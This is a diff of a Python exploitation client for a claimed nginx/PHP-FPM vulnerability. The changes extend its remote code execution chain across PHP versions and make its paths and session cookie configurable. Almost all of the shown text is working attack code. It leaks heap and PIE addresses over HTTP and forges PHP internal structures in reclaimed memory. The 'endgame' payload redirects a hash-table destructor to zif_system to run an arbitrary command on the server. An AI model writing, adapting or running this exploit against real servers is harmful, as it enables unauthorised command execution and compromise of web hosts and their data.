@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 php2shell_fpm.py — CVE-2026-109619 exploitation client for nginx + PHP-FPM.
 
@@ -45,6 +44,8 @@ Subcommands:
 from __future__ import annotations
 
 import argparse
+import contextlib
+import copy
 import json
 import os
 import re
@@ -57,6 +58,10 @@ import urllib.parse
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
+sys.path.insert(0, HERE)
+
+import php2shell_fpm_versions as registry  # noqa: E402
+
 LAB = os.path.join(ROOT, "lab", "fpm")
 RUNTIME = os.path.join(LAB, "runtime")
 
@@ -66,6 +71,27 @@ MEM_CHUNK = 0x200000
 
 OOM_SID = b"fmroom000000000001"
 REF_SID = b"fpmref000000000001"
+
+PATHS = {
+    "app": "/app.php",
+    "arm": "/bigvar.php",
+    "ref": "/ref.php",
+    "probe": "/nope.php",
+    "cookie": "PHPSESSID",
+}
+
+
+def _cookie(sid: bytes) -> bytes:
+    return PATHS["cookie"].encode("latin1") + b"=" + sid
+
+
+def configure_paths(args) -> None:
+    for key, attr in (("app", "app_path"), ("arm", "arm_path"),
+                      ("ref", "ref_path"), ("probe", "probe_path"),
+                      ("cookie", "session_cookie")):
+        value = getattr(args, attr, None)
+        if value:
+            PATHS[key] = str(value)
 
 
 # --------------------------------------------------------------------------- #
@@ -249,15 +275,19 @@ class Oracle:
         return struct.unpack("<I", self.read(addr, 4))[0]
 
     def unserialize_data(self) -> int:
-        return self.u64(self.bg + BG_UNSERIALIZE_DATA_OFF)
+        data_off, _level_off = _bg_offsets(self.version)
+        return self.u64(self.bg + data_off)
 
     def unserialize_level(self) -> int:
-        return self.u32(self.bg + BG_UNSERIALIZE_LEVEL_OFF)
+        _data_off, level_off = _bg_offsets(self.version)
+        return self.u32(self.bg + level_off)
 
     def chunk_base(self, addr: int) -> int | None:
         for start, end, perms in self.maps:
-            if start <= addr < end and "rw-p" in perms and end - start == MEM_CHUNK:
-                return start
+            if start <= addr < end and "rw-p" in perms and end - start >= MEM_CHUNK:
+                base = addr & ~(MEM_CHUNK - 1)
+                if start <= base and base + MEM_CHUNK <= end:
+                    return base
         return None
 
     def refresh(self) -> None:
@@ -273,7 +303,7 @@ class Oracle:
         print(f"zif_system  0x{self.zif:x}")
         print(f"zval_ptrdtor 0x{self.dtor:x}")
         print(f"BG.data     0x{d:x}  level={level}")
-        print(f"chunk_base  {('0x%x' % chunk) if chunk else None}")
+        print(f"chunk_base  {hex(chunk) if chunk else None}")
 
 
 # --------------------------------------------------------------------------- #
@@ -287,7 +317,7 @@ def session_file(version: str, sid: bytes) -> str:
 def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes]:
     """Progress-key 4MB string -> session file with a huge key (cleanup=Off)."""
     parts = [
-        {"name": "PHPSESSID", "data": sid},
+        {"name": PATHS["cookie"], "data": sid},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"A" * size},
         {"name": "f", "filename": "a.txt", "data": b"x" * 16},
     ]
@@ -298,12 +328,12 @@ def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes
 def ref_session_post(builder: Target, sid: bytes) -> tuple[int, bytes]:
     """ref.php stores $_SESSION['r'] =& $_SESSION['a'] -> 'R:2' in the file."""
     status, _headers, body = builder.post_urlencoded(
-        {"x": "1"}, cookie=b"PHPSESSID=" + sid, path="/ref.php")
+        {"x": "1"}, cookie=_cookie(sid), path=PATHS["ref"])
     return status, body
 
 
 def producer_get(chain: Target, sid: bytes) -> tuple[int, bytes]:
-    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
+    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
     return status, body
 
 
@@ -325,9 +355,79 @@ def _arm_stale(base: Target, builder: Target, oracle: Oracle, size: int) -> int:
     return d
 
 
+def _reclaim_pads(version: str, override: list[int] | None = None) -> list[int]:
+    if override:
+        return [int(x) for x in override]
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            return [int(x) for x in
+                    json.load(handle)["fpm"].get("reclaim_pads",
+                                                 [4096, 4096, 4096])]
+    except (OSError, KeyError, TypeError, ValueError):
+        return [4096, 4096, 4096]
+
+
+def _load_profile(version: str) -> dict | None:
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            return json.load(handle)
+    except (OSError, ValueError):
+        return None
+
+
+# Layout of the structures the forged buffer impersonates.  The values are
+# the PHP 8.4 ones and are only used when a profile carries no "layout"
+# section (profiles generated by tools/php2shell_fpm_profile.py always do).
+DEFAULT_LAYOUT = {
+    "unserialize_data": {
+        "last": 0, "first_dtor": 8, "last_dtor": 16, "allowed_classes": 24,
+        "ref_props": 32, "cur_depth": 40, "max_depth": 48, "entries": 56,
+        "size": 8216,
+    },
+    "var_entries": {"used_slots": 0, "next": 8, "data": 16, "max": 1018},
+    "zval": {"value": 0, "type_info": 8, "context": 12, "size": 16},
+    "zend_array": {"gc": 0, "flags": 8, "nTableMask": 12, "arData": 16,
+                   "nNumUsed": 24, "nNumOfElements": 28, "nTableSize": 32,
+                   "pDestructor": 48},
+    "zend_reference": {"gc": 0, "val": 8, "val_type_info": 16, "sources": 24},
+    "zend_string": {"gc": 0, "h": 8, "len": 16, "val": 24},
+    "zend_execute_data": {"opline": 0, "call": 8, "return_value": 16,
+                          "func": 24, "num_args": 44, "arg1": 80},
+    "bucket": {"val": 0, "h": 16, "key": 24},
+}
+
+
+def _layout(version: str) -> dict:
+    """Struct layout of a PHP build (from its profile)."""
+    profile = _load_profile(version)
+    layout = copy.deepcopy(DEFAULT_LAYOUT)
+    if profile and isinstance(profile.get("layout"), dict):
+        for section, values in profile["layout"].items():
+            if isinstance(values, dict):
+                merged = dict(layout.get(section, {}))
+                merged.update(values)
+                layout[section] = merged
+    return layout
+
+
+def _bg_offsets(version: str) -> tuple[int, int]:
+    """(data offset, level offset) of BG(unserialize) for a build."""
+    profile = _load_profile(version)
+    if profile:
+        meta = profile.get("fpm", {})
+        if "bg_unserialize_data_off" in meta and "bg_unserialize_level_off" in meta:
+            return int(meta["bg_unserialize_data_off"]), \
+                int(meta["bg_unserialize_level_off"])
+    return BG_UNSERIALIZE_DATA_OFF, BG_UNSERIALIZE_LEVEL_OFF
+
+
 def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
-                 size: int = 12288) -> int | None:
-    """Land a patterned reclaim buffer (3x4096 pads + one big field) over d
+                 size: int = 12288,
+                 pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
+                 ) -> int | None:
+    """Land a patterned reclaim buffer (pads + one big field) over d
     against a 404 endpoint, scan the mem chunk for the unique marker, and
     return the content offset K such that buffer+K == d."""
     chunk = oracle.chunk_base(d)
@@ -338,7 +438,8 @@ def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
     marker = b"MK" + os.urandom(6)
     content = bytearray(b"\x00" * size)
     content[0:8] = marker
-    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(pads)]
     parts.append({"name": "big", "data": bytes(content)})
     chain404.post_multipart(parts, b"PRBLAND1")
     oracle.refresh()
@@ -352,6 +453,10 @@ def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
         idx = pos + 1
     d_off = d - chunk
     cover = [h for h in hits if h <= d_off and d_off + need <= h + size]
+    if os.environ.get("PHP2SHELL_DEBUG"):
+        print(f"[debug] d={d:#x} chunk={chunk:#x} d_off={d_off:#x} "
+              f"need={need:#x} size={size:#x} hits={[hex(h) for h in hits]} "
+              f"cover={[hex(h) for h in cover]}")
     if not cover:
         print(f"[!] no covering reclaim buffer (hits={[hex(h) for h in hits]})")
         return None
@@ -368,18 +473,21 @@ def _rebuild_ref_and_arm(base: Target, builder: Target, oracle: Oracle,
     return _arm_stale(base, builder, oracle, oom_size)
 
 
-def _consume_b(chainapp: Target, forged: bytes) -> tuple[int, dict[str, str], bytes]:
+def _consume_b(chainapp: Target, forged: bytes,
+               pads: list[int] | tuple[int, ...] = (4096, 4096, 4096)
+               ) -> tuple[int, dict[str, str], bytes]:
     """Consume with the forged reclaim buffer.
 
     Consumer B MUST carry the PHP_SESSION_UPLOAD_PROGRESS field and a file
     part: rfc1867 has to fire the pre-RINIT session_start, otherwise the
     decode would run post-RINIT against a memset BG(unserialize)."""
-    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(pads)]
     parts.append({"name": "big", "data": forged})
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
     status, headers, body = chainapp.post_multipart(parts, b"CONSUME01",
-                                                    cookie=b"PHPSESSID=" + REF_SID)
+                                                    cookie=_cookie(REF_SID))
     print(f"[*] consumer status={status}")
     return status, headers, body
 
@@ -439,7 +547,10 @@ def cmd_build_ref(args) -> int:
     sid = REF_SID
     status, body = ref_session_post(builder, sid)
     path = session_file(args.version, sid)
-    content = open(path, "rb").read() if os.path.isfile(path) else b""
+    content = b""
+    if os.path.isfile(path):
+        with open(path, "rb") as handle:
+            content = handle.read()
     print(f"builder status={status} body={body[:40]!r}")
     print(f"session_file={path} content={content!r}")
     return 0 if b"R:2" in content else 1
@@ -449,7 +560,7 @@ def cmd_producer(args) -> int:
     chain = Target(args.base)
     sid = args.sid.encode("latin1")
     before = find_pool_worker(args.version, "chain")
-    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
+    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
     time.sleep(0.2)
     after = find_pool_worker(args.version, "chain")
     print(f"producer status={status} worker {before} -> {after} "
@@ -531,11 +642,102 @@ def _forged_benign(param_addr: int) -> bytes:
     # +56 entries.used_slots = 8 (so R:2 -> data[1] is inside our data[])
     struct.pack_into("<q", buf, 56, 8)
     # FZ at +0x300: IS_LONG 424242
-    fz = param_addr + 0x300  # placeholder; caller rewrites with real d-relative
     struct.pack_into("<Q", buf, 72 + 8, 0)  # data[1] set by caller
     struct.pack_into("<Q", buf, 0x300, 424242)
     struct.pack_into("<I", buf, 0x308, 4)   # IS_LONG
     return bytes(buf)
+
+
+def _build_primitive_payload(d: int, k: int, size: int, value: int,
+                             layout: dict | None = None) -> bytes:
+    """Forged reclaim buffer with a benign fake zval (the calibration step).
+
+    The buffer impersonates the freed php_unserialize_data struct: ``last``
+    points at the ``entries`` block, ``entries.used_slots`` is 2 so that the
+    R:2 reference of the session file resolves to ``data[1]``, and ``data[1]``
+    points at a fake IS_LONG zval holding ``value``.  app.php echoes the
+    value back, which proves the primitive without firing a destructor.
+
+    PHP <= 7.3 (``layout["unserialize_data"]["legacy"]``) has no embedded
+    block: ``first``/``last`` point at a separately allocated var_entries
+    whose ``data[]`` comes first, so the fake block starts at the beginning
+    of the reclaim buffer itself.  ``first`` has to be the address of a real
+    allocation because PHP 7's var_destroy() frees every block it walks.
+    """
+    layout = layout or DEFAULT_LAYOUT
+    uns = layout["unserialize_data"]
+    zval = layout["zval"]
+    forged = bytearray(size)
+    entries = uns["entries"]
+    data_base = entries + layout["var_entries"]["data"]
+    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
+    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
+    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+    struct.pack_into("<q", forged, k + entries + layout["var_entries"]["used_slots"], 2)
+    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+    struct.pack_into("<Q", forged, k + 0x300, value)
+    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 4)
+    struct.pack_into("<q", forged, k + 0x400, 0)
+    return bytes(forged)
+
+
+def _build_leak_payload(d: int, k: int, size: int, read_len: int,
+                        layout: dict | None = None) -> bytes:
+    """Forged reclaim buffer that turns the stale ``r`` into a long OOB string.
+
+    The string-slot leak needs the freed k1 slot to be reused by the reclaim
+    buffer, which depends on the allocator of the build.  This variant does
+    not: R:2 resolves to a fake IS_STRING zval planted next to the fake
+    struct, whose zend_string also lives inside the reclaim buffer, so
+    echoing ``r`` dumps ``read_len`` bytes starting inside the buffer and
+    running through the chunk.  Only the reclaim geometry (which the same
+    sweep discovers) is required.
+    """
+    layout = layout or DEFAULT_LAYOUT
+    uns = layout["unserialize_data"]
+    zval = layout["zval"]
+    string = layout["zend_string"]
+    ve = layout["var_entries"]
+    forged = bytearray(size)
+    entries = uns["entries"]
+    data_base = entries + ve["data"]
+    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x600)
+    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x600)
+    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
+    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+    struct.pack_into("<q", forged, k + 0x600, 0)      # empty dtor list
+    # fake zval at d+0x300: IS_STRING_EX -> forged zend_string at d+0x400
+    struct.pack_into("<Q", forged, k + 0x300, d + 0x400)
+    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x106)
+    # forged zend_string at d+0x400: the read starts right after its header
+    struct.pack_into("<I", forged, k + 0x400 + string["gc"], 1)
+    struct.pack_into("<I", forged, k + 0x400 + string["gc"] + 4, 6)
+    struct.pack_into("<Q", forged, k + 0x400 + string["len"], read_len)
+    content_off = k + 0x400 + string["val"]
+    fill = min(read_len, size - content_off)
+    if fill > 0:
+        forged[content_off:content_off + fill] = b"Q" * fill
+    return bytes(forged)
+
+
+def _remote_leak_probe(base: str, builder: str, version: str, chunk: int,
+                       d_off: int, k: int, size: int, pads: list[int],
+                       read_len: int | None = None) -> bytes | None:
+    """Consume with the direct-leak payload and return the reflected bytes."""
+    chainapp = Target(base + PATHS["app"])
+    layout = _layout(version)
+    read_len = read_len or LEAK_READ_LEN
+    _remote_arm_and_normalize(base, builder, size, pads, size)
+    forged = _build_leak_payload(chunk + d_off, k, size, read_len, layout)
+    _status, _headers, body = _consume_b(chainapp, forged, pads)
+    raw = _dechunk(body)
+    index = raw.find(b"r\t")
+    if index < 0:
+        return None
+    return raw[index + 2:index + 2 + read_len]
 
 
 def cmd_primitive(args) -> int:
@@ -554,18 +756,24 @@ def cmd_primitive(args) -> int:
     if the re-armed consume d differs from the probed d, retry (the pair
     stabilizes after at most one mismatch)."""
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     oracle = Oracle(args.version)
-    size, need = 16384, 0x440
+    pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
+    layout = _layout(args.version)
+    size = int(getattr(args, "reclaim_size", 0) or 16384)
+    need = 0x440
 
-    for _attempt in range(4):
+    for _attempt in range(8):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
-            k = _probe_cover(chain404, oracle, d, need, size)
+            k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
-                return 1
+                # the recycled struct alternates between two slots; the
+                # reclaim buffer only covers one of them per attempt
+                time.sleep(0.3)
+                continue
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
         except (RuntimeError, OSError) as exc:
             print(f"[!] {exc}; refreshing oracle")
@@ -579,18 +787,9 @@ def cmd_primitive(args) -> int:
         if d2 != d:
             print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
             continue
-        forged = bytearray(size)
-        struct.pack_into("<Q", forged, k + 0,   d + 56)      # last -> &entries
-        struct.pack_into("<Q", forged, k + 8,   d + 0x400)   # first_dtor -> fake
-        struct.pack_into("<Q", forged, k + 16,  d + 0x400)   # last_dtor -> fake
-        struct.pack_into("<q", forged, k + 48,  64)          # max_depth
-        struct.pack_into("<q", forged, k + 56,  2)           # entries.used_slots
-        struct.pack_into("<Q", forged, k + 80,  d + 0x300)   # data[1] -> fake zval
-        struct.pack_into("<Q", forged, k + 0x300, args.value)
-        struct.pack_into("<I", forged, k + 0x308, 4)         # IS_LONG
-        struct.pack_into("<q", forged, k + 0x400, 0)         # fake dtor used_slots
+        forged = _build_primitive_payload(d, k, size, args.value, layout)
 
-        status, _h, body = _consume_b(chainapp, bytes(forged))
+        status, _h, body = _consume_b(chainapp, forged, pads)
         text = body.decode("latin1", "replace")
         print(f"    body: {text[:300]!r}")
         needle = str(args.value).encode()
@@ -602,7 +801,8 @@ def cmd_primitive(args) -> int:
 
 
 def _build_endgame_payload(d: int, k: int, size: int, zif: int,
-                           command: bytes) -> bytes:
+                           command: bytes,
+                           layout: dict | None = None) -> bytes:
     """Build the forged reclaim buffer for the endgame chain.
 
     Layout (content offsets from K; every absolute address is d-relative):
@@ -614,49 +814,70 @@ def _build_endgame_payload(d: int, k: int, size: int, zif: int,
       K+0x800  fake Bucket doubling as the zif_system execute_data frame
       K+0x880  fake zend_string holding the command
       K+0x8F0  writable scratch for the zif_system return_value
+
+    The struct offsets inside the fake objects come from the profile's
+    "layout" section, which is generated from the build's own headers: the
+    zend_array / zend_reference / zend_execute_data layouts moved between
+    PHP releases.
     """
+    layout = layout or DEFAULT_LAYOUT
     forged = bytearray(size)
+    uns = layout["unserialize_data"]
+    zval = layout["zval"]
+    array = layout["zend_array"]
+    ref = layout["zend_reference"]
+    string = layout["zend_string"]
+    frame = layout["zend_execute_data"]
+    ve = layout["var_entries"]
     # decode-time forged struct (identical to the primitive)
-    struct.pack_into("<Q", forged, k + 0,   d + 56)       # last -> &entries
-    struct.pack_into("<Q", forged, k + 8,   d + 0x400)    # first_dtor -> fake
-    struct.pack_into("<Q", forged, k + 16,  d + 0x400)    # last_dtor -> fake
-    struct.pack_into("<q", forged, k + 48,  64)           # max_depth
-    struct.pack_into("<q", forged, k + 56,  2)            # entries.used_slots
-    struct.pack_into("<Q", forged, k + 80,  d + 0x300)    # data[1] -> fake zval
-    struct.pack_into("<q", forged, k + 0x400, 0)          # fake dtor used_slots
+    entries = uns["entries"]
+    data_base = entries + ve["data"]
+    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
+    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
+    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
+    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+    struct.pack_into("<q", forged, k + 0x400, 0)      # fake dtor used_slots
     # fake zval at d+0x300: IS_REFERENCE -> fake ref at d+0x500
     struct.pack_into("<Q", forged, k + 0x300, d + 0x500)
-    struct.pack_into("<I", forged, k + 0x308, 0x10A)      # IS_REFERENCE_EX
+    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x10A)
     # fake zend_reference at d+0x500: rc forged 0; ZVAL_COPY addrefs -> 1
-    struct.pack_into("<I", forged, k + 0x500, 0)          # gc.refcount
-    struct.pack_into("<I", forged, k + 0x504, 10)         # gc.type_info IS_REFERENCE
-    struct.pack_into("<Q", forged, k + 0x508, d + 0x700)  # ref->val.arr
-    struct.pack_into("<I", forged, k + 0x510, 0x307)      # val IS_ARRAY_EX
-    struct.pack_into("<Q", forged, k + 0x518, 0)          # sources = NULL
+    struct.pack_into("<I", forged, k + 0x500 + ref["gc"], 0)
+    struct.pack_into("<I", forged, k + 0x500 + ref["gc"] + 4, 10)  # IS_REFERENCE
+    struct.pack_into("<Q", forged, k + 0x500 + ref["val"], d + 0x700)
+    struct.pack_into("<I", forged, k + 0x500 + ref["val_type_info"], 0x307)
+    # zend_reference.sources exists from PHP 7.3 on; PHP 7.0-7.2 layouts
+    # record it as null and the reference simply ends after "val".
+    if ref.get("sources") is not None:
+        struct.pack_into("<Q", forged, k + 0x500 + ref["sources"], 0)
     # fake HashTable at d+0x700: rc 1; session dtor delrefs -> 0 -> fire
-    struct.pack_into("<I", forged, k + 0x700, 1)          # gc.refcount
-    struct.pack_into("<I", forged, k + 0x704, 7)          # gc.type_info IS_ARRAY
-    struct.pack_into("<I", forged, k + 0x708, 0x10)       # HASH_FLAG_STATIC_KEYS
-    struct.pack_into("<I", forged, k + 0x70C, 0xFFFFFFF8) # nTableMask (unpacked)
-    struct.pack_into("<Q", forged, k + 0x710, d + 0x800)  # arData -> fake bucket
-    struct.pack_into("<I", forged, k + 0x718, 1)          # nNumUsed
-    struct.pack_into("<I", forged, k + 0x71C, 1)          # nNumOfElements
-    struct.pack_into("<I", forged, k + 0x720, 8)          # nTableSize
-    struct.pack_into("<Q", forged, k + 0x730, zif)        # pDestructor = zif_system
+    struct.pack_into("<I", forged, k + 0x700 + array["gc"], 1)
+    struct.pack_into("<I", forged, k + 0x700 + array["gc"] + 4, 7)   # IS_ARRAY
+    struct.pack_into("<I", forged, k + 0x700 + array["flags"], 0x10)  # STATIC_KEYS
+    struct.pack_into("<I", forged, k + 0x700 + array["nTableMask"], 0xFFFFFFF8)
+    struct.pack_into("<Q", forged, k + 0x700 + array["arData"], d + 0x800)
+    struct.pack_into("<I", forged, k + 0x700 + array["nNumUsed"], 1)
+    struct.pack_into("<I", forged, k + 0x700 + array["nNumOfElements"], 1)
+    struct.pack_into("<I", forged, k + 0x700 + array["nTableSize"], 8)
+    struct.pack_into("<Q", forged, k + 0x700 + array["pDestructor"], zif)
     # fake Bucket at d+0x800 doubling as the zif_system execute_data frame:
-    # bucket.val = IS_STRING -> fake zend_string; E+0x10 return_value ->
-    # writable scratch; E+0x2C num_args=1; E+0x50 arg1 zval
+    # bucket.val = IS_STRING -> fake zend_string; the frame's return_value
+    # points at writable scratch; num_args=1; arg1 zval points at the
+    # fake zend_string holding the command.
     struct.pack_into("<Q", forged, k + 0x800, d + 0x880)  # val.str / opline
-    struct.pack_into("<I", forged, k + 0x808, 6)          # val IS_STRING (non-UNDEF)
-    struct.pack_into("<Q", forged, k + 0x810, d + 0x8F0)  # h / return_value scratch
-    struct.pack_into("<H", forged, k + 0x82C, 1)          # num_args
-    struct.pack_into("<Q", forged, k + 0x850, d + 0x880)  # arg1.str
-    struct.pack_into("<I", forged, k + 0x858, 0x106)      # arg1 IS_STRING_EX
+    struct.pack_into("<I", forged, k + 0x800 + zval["type_info"], 6)
+    struct.pack_into("<Q", forged, k + 0x800 + frame["return_value"], d + 0x8F0)
+    struct.pack_into("<H", forged, k + 0x800 + frame["num_args"], 1)
+    struct.pack_into("<Q", forged, k + 0x800 + frame["arg1"], d + 0x880)
+    struct.pack_into("<I", forged, k + 0x800 + frame["arg1"] + zval["type_info"],
+                     0x106)
     # fake zend_string at d+0x880: command (NUL from the zero-filled buffer)
-    struct.pack_into("<I", forged, k + 0x880, 1)          # gc.refcount
-    struct.pack_into("<I", forged, k + 0x884, 6)          # gc.type_info IS_STRING
-    struct.pack_into("<Q", forged, k + 0x890, len(command))
-    forged[k + 0x898:k + 0x898 + len(command)] = command
+    struct.pack_into("<I", forged, k + 0x880 + string["gc"], 1)
+    struct.pack_into("<I", forged, k + 0x880 + string["gc"] + 4, 6)  # IS_STRING
+    struct.pack_into("<Q", forged, k + 0x880 + string["len"], len(command))
+    forged[k + 0x880 + string["val"]:
+           k + 0x880 + string["val"] + len(command)] = command
     return bytes(forged)
 
 
@@ -701,27 +922,30 @@ def cmd_endgame(args) -> int:
         return 1
     proof = (args.proof_file or "out/p1").lstrip("/")
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     oracle = Oracle(args.version)
-    size, need = 12288, 0x900
+    pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
+    layout = _layout(args.version)
+    size = int(getattr(args, "reclaim_size", 0) or 12288)
+    need = 0x900
 
     local_proof = os.path.join(LAB, "webroot", proof)
-    try:
+    with contextlib.suppress(OSError):
         os.remove(local_proof)
-    except OSError:
-        pass
 
     worker_before = find_pool_worker(args.version, "chain")
-    for _attempt in range(4):
+    for _attempt in range(8):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
-            k = _probe_cover(chain404, oracle, d, need, size)
+            k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
-                print("[*] probe found no cover; "
-                      "falling back to the two-slot no-oracle geometry")
-                return cmd_no_oracle(args)
+                # the recycled struct alternates between two slots; the
+                # reclaim buffer only covers one of them per attempt
+                print("[*] probe found no cover; retrying")
+                time.sleep(0.3)
+                continue
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
         except (RuntimeError, OSError) as exc:
             # a dead worker (stale /proc pid) or a missed arm: rebuild the
@@ -737,15 +961,16 @@ def cmd_endgame(args) -> int:
         if d2 != d:
             print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
             continue
-        forged = _build_endgame_payload(d, k, size, oracle.zif, command)
+        forged = _build_endgame_payload(d, k, size, oracle.zif, command, layout)
 
-        status, _h, _body = _consume_b(chainapp, forged)
+        status, _h, _body = _consume_b(chainapp, forged, pads)
         print(f"[*] command {command!r} fired (status={status}); waiting for "
               f"worker respawn ...")
         break
     else:
-        print("[!] reclaim slot never stabilized")
-        return 1
+        print("[!] reclaim slot never stabilized; falling back to the "
+              "no-oracle geometry")
+        return cmd_no_oracle(args)
 
     time.sleep(0.8)
     worker_after = find_pool_worker(args.version, "chain")
@@ -845,20 +1070,16 @@ def _dechunk(body: bytes) -> bytes:
     return bytes(out)
 
 
-def leak_bases_http(base_url: str, builder_url: str,
-                    version: str) -> tuple[int, int]:
-    """Leak PIE and Zend-MM chunk bases over HTTP only.
+def _leak_read(base_url: str, builder_url: str, version: str, geom: dict,
+               attempts: int = 3) -> bytes | None:
+    """One stale-string OOB read with an explicit geometry; HTTP only.
 
-    The stale short-session string is pointed at a forged zend_string
-    header in a reclaimed big field.  Its length spans the stale zval
-    array (chunk pointer) and the execute_ex handler table (PIE pointer).
-    The leak read is repeated because the worker aborts after answering.
+    ``geom`` only needs arm_path/pads/size/header_content_off/read_len, so
+    the same request runs both with the calibrated geometry of a profile and
+    with a candidate geometry while one is being discovered.
     """
-    geom = _leak_geometry(version)
-    if geom is None:
-        raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
     chain = Target(base_url)
-    app = Target(base_url + "/app.php")
+    app = Target(base_url + PATHS["app"])
     builder = Target(builder_url)
     size = geom["size"]
     read_len = geom["read_len"]
@@ -869,47 +1090,186 @@ def leak_bases_http(base_url: str, builder_url: str,
     struct.pack_into("<Q", content, header + 8, 0)           # h
     struct.pack_into("<Q", content, header + 0x10, read_len) # len
     fill = min(read_len, size - header - 0x18)
-    content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
+    if fill > 0:
+        content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
     parts = [{"name": f"pad{i}", "data": b"C" * pad}
              for i, pad in enumerate(geom["pads"])]
     parts.append({"name": "big", "data": bytes(content)})
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
-    for attempt in range(10):
+    for attempt in range(attempts):
+        if attempt:
+            time.sleep(0.25)
+        # A reset request after a killed worker clears stale session/lock
+        # state; without it a post-fire leak can fail on an otherwise healthy
+        # respawned worker.
+        with contextlib.suppress(OSError):
+            ref_session_post(builder, REF_SID)
+            app.get(PATHS["app"], cookie=_cookie(REF_SID))
         try:
-            builder.get(geom["arm_path"], cookie=b"PHPSESSID=" + OOM_SID)
-            chain.get("/app.php", cookie=b"PHPSESSID=" + OOM_SID)
+            builder.get(geom["arm_path"], cookie=_cookie(OOM_SID))
+            chain.get(PATHS["app"], cookie=_cookie(OOM_SID))
             ref_session_post(builder, REF_SID)
             _status, _headers, body = app.post_multipart(
-                parts, b"HTTPLEAK", cookie=b"PHPSESSID=" + REF_SID,
+                parts, b"HTTPLEAK", cookie=_cookie(REF_SID),
                 timeout=180.0)
             raw = _dechunk(body)
             idx = raw.find(b"r\t")
             if idx < 0:
                 continue
             read = raw[idx + 2:idx + 2 + read_len]
-            if len(read) < read_len:
-                continue
+            if len(read) >= read_len:
+                return read
+        except (OSError, RuntimeError, TimeoutError):
+            continue
+    return None
+
+
+def leak_bases_http(base_url: str, builder_url: str, version: str,
+                    arm_path: str | None = None) -> tuple[int, int]:
+    """Leak PIE and Zend-MM chunk bases over HTTP only.
+
+    The stale short-session string is pointed at a forged zend_string
+    header in a reclaimed big field.  Its length spans the stale zval
+    array (chunk pointer) and the execute_ex handler table (PIE pointer).
+    The leak read is repeated because the worker aborts after answering.
+    """
+    geom = _leak_geometry(version)
+    if geom is None:
+        raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
+    if arm_path:
+        geom = dict(geom, arm_path=arm_path)
+    for attempt in range(10):
+        if attempt:
+            time.sleep(0.25)
+        read = _leak_read(base_url, builder_url, version, geom, attempts=1)
+        if read is None:
+            continue
+        try:
             chunk_ptr = struct.unpack_from("<Q", read,
                                            geom["chunk_ptr_off"])[0]
             pie_ptr = struct.unpack_from("<Q", read,
                                          geom["pie_ptr_off"])[0]
-            chunk = chunk_ptr - geom["chunk_base_off"]
